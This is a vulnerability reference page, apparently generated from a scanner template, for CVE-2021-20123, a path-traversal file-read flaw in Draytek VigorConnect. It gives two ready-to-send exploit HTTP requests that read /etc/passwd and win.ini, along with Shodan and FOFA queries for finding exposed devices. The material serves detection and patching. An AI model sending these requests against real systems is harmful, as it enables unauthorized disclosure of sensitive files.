---
layout: "post"
cve_id: "CVE-2021-20123"
title: "Draytek VigorConnect 1.6.0-B - Local File Inclusion"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-20123.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-20123.yaml"
author: "0x_Akoko"
severity: "high"
impact: "Successful exploitation of this vulnerability could allow an attacker to read sensitive files on the server, potentially leading to unauthorized access or information disclosure.
"
remediation: "Apply the latest security patches or updates provided by the vendor to fix the LFI vulnerability in Draytek VigorConnect 1.6.0-B.
"
reference:
  - "https://www.tenable.com/security/research/tra-2021-42"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-20123"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2021-20123', 'cwe-id': 'CWE-22', 'epss-score': 0.93989, 'epss-percentile': 0.99882, 'cpe': 'cpe:2.3:a:draytek:vigorconnect:1.6.0:beta3:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 2, 'vendor': 'draytek', 'product': 'vigorconnect', 'shodan-query': ['http.html:"VigorConnect"', 'http.html:"vigorconnect"'], 'fofa-query': 'body="vigorconnect"'}"
tags:
  - "cve2021"
  - "cve"
  - "draytek"
  - "lfi"
  - "vigorconnect"
  - "tenable"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion in the file download functionality of the DownloadFileServlet endpoint. An unauthenticated attacker could leverage this vulnerability to download arbitrary files from the underlying operating system with root privileges.


## üåê HTTP Request
```nohighlight
GET /ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

